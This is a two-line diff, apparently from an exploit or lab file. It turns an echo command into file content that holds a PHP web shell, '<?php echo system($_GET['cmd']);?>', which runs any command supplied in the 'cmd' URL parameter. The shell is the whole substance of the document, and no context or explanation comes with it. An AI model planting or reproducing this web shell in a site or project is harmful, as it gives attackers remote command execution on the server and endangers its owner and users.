@@ -1,1 +1,2 @@
-echo '-AL<br><?php echo system($_GET['cmd']);?>'
+-AL<br>
+<?php echo system($_GET['cmd']);?>
